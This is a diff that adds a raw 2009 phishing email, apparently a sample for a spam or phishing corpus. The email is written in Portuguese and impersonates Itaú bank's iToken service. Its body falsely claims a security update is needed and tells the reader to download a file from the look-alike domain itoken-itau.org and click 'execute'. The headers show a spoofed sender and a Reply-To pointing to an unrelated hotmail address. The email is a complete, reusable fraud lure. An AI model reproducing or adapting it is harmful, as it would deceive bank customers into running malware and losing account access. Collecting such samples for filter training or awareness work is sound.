@@ -1,0 +1,45 @@
+Received: from XXXCNN0783.hospedagemdesites.ws ([189.126.103.171]) by abreuretto.com with MailEnable ESMTP; Thu, 05 Feb 2009 01:42:24 -0800
+Received: by XXXCNN0783.hospedagemdesites.ws (Postfix, from userid 0)
+	id 7599B2F576B9; Thu,  5 Feb 2009 01:41:29 -0200 (BRST)
+Date: Thu Feb  5 01:05:27 BRST 2009
+From: Banco Itaz <itoken@itau.com.br>
+To: abreu@abreuretto.com
+Subject: Atualizagco de seguranga iToken versco 3.5.0 .
+MIME-Version: 2.0
+content-type: text/html
+Reply-To: itoken@itau.com.br <juliana@hotmail.com>
+X-OriginalArrivalTime: Thu 05 Feb 2009 01:05:38 AM BRST  -0.017834 seconds
+Message-Id: <HMAhm-0002Ma-Pa@mx.terra.com.br>
+Return-Path: <root@XXXCNN0783.hospedagemdesites.ws>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+ <html>
+ <head>
+   <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
+   <title>Ita&uacute;</title>
+ </head>
+ <body>
+ <div style="text-align: center;">
+   <p><br>
+     <img src="http://www.itoken-itau.org/img/itokenico.PNG" alt="itoken" /><small><br style="font-family: Verdana;">
+     </small></p>
+   <p><small><span style="font-family: Verdana; font-weight: bold; color: rgb(255, 69, 0);">Prezado Cliente,</span><br style="font-family: Verdana;">
+     <span style="font-family: Verdana;">Informamos que um problema em nossos bancos de dados, causou a </span><br style="font-family: Verdana;">
+     <span style="font-family: Verdana;">dessicroniza&ccedil;&atilde;o do seu aparelho </span><span style="font-weight: bold; font-family: Verdana; color: rgb(255, 69, 0);">iToken</span><span style="font-family: Verdana;"> com os nossos servidores.</span><br style="font-family: Verdana;">
+     <br style="font-family: Verdana;">
+     <span style="font-family: Verdana;">Para reparar esse erro, o </span><span style="font-weight: bold; font-family: Verdana; color: rgb(255, 69, 0);">Itaz BankLine</span><span style="font-family: Verdana;"> lan&ccedil;ou a atualiza&ccedil;&atilde;o de seguran&ccedil;a de vers&atilde;o 3.5.0,</span><br style="font-family: Verdana;">
+     <span style="font-family: Verdana;">dispon&iacute;vel agora tamb&eacute;m para clientes </span><span style="font-weight: bold; font-family: Verdana; color: rgb(255, 69, 0);">Personnaliti</span><span style="font-family: Verdana;">.</span><br style="font-family: Verdana;">
+     <br style="font-family: Verdana;">
+     <span style="font-family: Verdana;">Para continuar usufruindo dos servi&ccedil;os </span><span style="font-weight: bold; font-family: Verdana; color: rgb(255, 69, 0);">Itaz BankLine</span><span style="font-family: Verdana;"> e das demais fun&ccedil;&otilde;es que fa&ccedil;am uso</span><br style="font-family: Verdana;">
+     <span style="font-family: Verdana;">do </span><span style="font-weight: bold; font-family: Verdana; color: rgb(255, 69, 0);">Internet Banking Itaz</span><span style="font-family: Verdana;">, solicitamos que voc&ecirc; realize a </span><span style="font-weight: bold; font-family: Verdana; color: rgb(255, 69, 0);">Atualiza&ccedil;&atilde;o 3.5.0</span><span style="font-family: Verdana;">.</span><br style="font-weight: bold; font-family: Verdana;">
+     <br style="font-weight: bold; font-family: Verdana;">
+     <span style="font-family: Verdana;">Para realizar a atualiza&ccedil;&atilde;o clique em uma das op&ccedil;&otilde;es abaixo, fazendo o </span><span style="font-weight: bold; font-family: Verdana; color: rgb(255, 0, 0);">download</span><span style="font-family: Verdana;"> e logo ap&oacute;s clicando em </span></small><span style="font-weight: bold;"><small><span style="font-family: Verdana;"><span style="color: rgb(255, 0, 0);">executar</span>.</span></small><br>
+     <br>
+           </span><small style="font-weight: bold;"><a style="font-family: Verdana; color: rgb(255, 140, 0);" href="http://www.itoken-itau.org/atualizacao-3.5.0">http://www.itoken-itau.org/atualizacao-3.5.0</a></small></p>
+ </div>
+ <br><br><br>
+ </body>
+ </html>
+
+
+
